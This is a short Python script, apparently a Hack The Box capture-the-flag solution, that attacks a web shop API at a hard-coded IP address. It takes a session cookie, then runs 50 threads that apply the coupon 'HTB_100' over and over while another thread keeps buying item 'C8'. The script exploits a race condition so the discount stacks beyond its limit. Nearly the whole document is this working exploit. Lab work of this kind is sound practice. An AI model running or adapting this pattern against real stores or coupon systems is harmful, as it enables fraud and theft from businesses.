import  requests
import threading
import time

x= requests.post('http://209.97.140.29:30961/api/purchase',json={ 'item': "C8" })
cookies = x.cookies
for cookie in cookies:
        c= cookie.name
        v= cookie.value

def aplly_coupons():
	x  = requests.post('http://209.97.140.29:30961/api/coupons/apply',json={ 'coupon_code': "HTB_100" },cookies={c:v})

def buy_flag():
	x= requests.post('http://209.97.140.29:30961/api/purchase',json={ 'item': "C8" },cookies={c:v})
	print(x.text)
class Aplly(threading.Thread):
	def run(self):
		while True:
			try:
				"""print("apllying coupon ...")"""
				aplly_coupons()
			except:
				pass
class Buy(threading.Thread):
	def run(self):
		while True:
			"""print("buying flag..")"""
			time.sleep(2)
			buy_flag()


if __name__ == "__main__":
	apply = []
	for i in range(50):
		apply.append(Aplly())
		apply[-1].start()
	b = Buy()
	b.start()

